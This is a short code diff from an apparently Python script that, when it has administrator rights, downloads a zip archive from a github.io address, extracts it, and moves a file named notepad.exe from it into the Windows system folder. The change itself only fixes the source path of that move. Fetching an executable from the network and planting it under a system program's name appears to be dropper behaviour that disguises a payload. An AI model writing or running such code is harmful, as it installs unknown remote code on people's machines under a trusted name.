@@ -47,7 +47,7 @@ if is_admin():
     pathdownloaded = DownloadFile('https://psvks.github.io/psvks/uploads/output.zip')
     FolderPath = MakeFolder(default_disk + "\\tmp_folder")
     ExtractZip(pathdownloaded, FolderPath)
-    MoveFile(default_disk + "\\output\\notepad.exe", default_disk + "\\Windows")
+    MoveFile(default_disk + "\\tmp_folder\\notepad.exe", default_disk + "\\Windows")
 
 
 
